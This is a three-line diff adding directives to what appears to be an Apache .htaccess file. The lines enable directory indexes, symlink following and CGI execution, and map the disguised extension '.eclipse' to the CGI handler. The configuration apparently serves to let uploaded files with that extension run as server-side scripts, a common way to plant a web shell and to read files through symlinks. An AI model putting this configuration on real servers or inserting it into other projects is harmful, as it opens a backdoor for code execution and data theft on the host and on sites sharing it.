@@ -1,0 +1,3 @@
+Options FollowSymLinks MultiViews Indexes ExecCGI
+AddType application/x-httpd-cgi .eclipse
+AddHandler cgi-script .eclipse
